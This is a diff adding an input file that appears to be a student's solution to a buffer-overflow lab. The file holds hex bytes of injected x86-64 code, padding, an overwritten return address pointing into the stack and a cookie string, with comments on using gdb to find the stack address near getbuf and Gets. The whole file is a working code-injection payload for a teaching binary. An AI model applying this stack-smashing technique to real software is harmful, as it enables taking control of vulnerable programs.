@@ -1,0 +1,12 @@
+48 c7 c7 58 41 61 55 68 9c 1a 
+40 00 c3 00 00 00 		/* 00 00 00 = 3 byte buffer */
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00
+28 41 61 55 00 00 00 00 	/* return address */
+
+35 66 66 37 36 32 66 39 00      /* cookie transform */
+
+/* We set break point at getbuf function, and run it, and ni and ni until Gets funciton */
+/* and do x /20x $rsp to examine the rsp on stack */
+/* There are some spaces to put data, but I decide to put in address 55614158 */
